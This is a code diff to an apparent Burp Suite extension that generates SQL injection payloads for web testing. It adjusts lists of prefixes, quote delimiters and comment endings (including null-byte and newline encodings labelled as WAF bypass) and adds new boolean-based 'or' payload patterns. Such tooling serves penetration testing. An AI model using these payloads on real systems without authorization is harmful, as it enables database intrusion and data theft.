@@ -441,7 +441,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbDictEncoding= JCheckBox('Waf Bypass', True)
         self._cbDictEquality= JCheckBox(')', False)
         self._cbDictDepth = JComboBox(list(range(0, 20)))
-        self._cbDictDepth.setSelectedIndex(5)
+        self._cbDictDepth.setSelectedIndex(10)
         _cbDictDepthPanel = JPanel()
         _cbDictDepthPanel.add(self._cbDictDepth)
         self._cbTimeBased= JCheckBox('Time-Based Inj', True)
@@ -673,11 +673,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 return
 
         listSQLi = []
-        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
+        #prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
         prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
         #prefixes = [""]
 
-        delimeterStarts = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
+        #delimeterStarts = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
         delimeterStarts = ["'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
         #delimeterStarts = ["'"]
         
@@ -686,7 +686,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         #delimeterBooleans = ["true"]
         
         delimeterEnds = ["", ";", " -- ", "; -- "]
-        delimeterEnds = ["", "--"]
+        #delimeterEnds = ["", "--"]
 
         if self._cbBooleanBased.isSelected():
             for prefix in prefixes:
@@ -695,6 +695,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                         for delimeterEnd in delimeterEnds:
                             if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
                                 listSQLi.append(prefix + delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")
+                                listSQLi.append(prefix + delimeterStart + " or " + delimeterBoolean + delimeterStart + "\n")
+                                listSQLi.append(prefix + " or " + delimeterBoolean + delimeterEnd + "\n")
             for prefix in prefixes:
                 #for delimeterStart in delimeterStarts[1:]:
                 for delimeterStart in delimeterStarts:
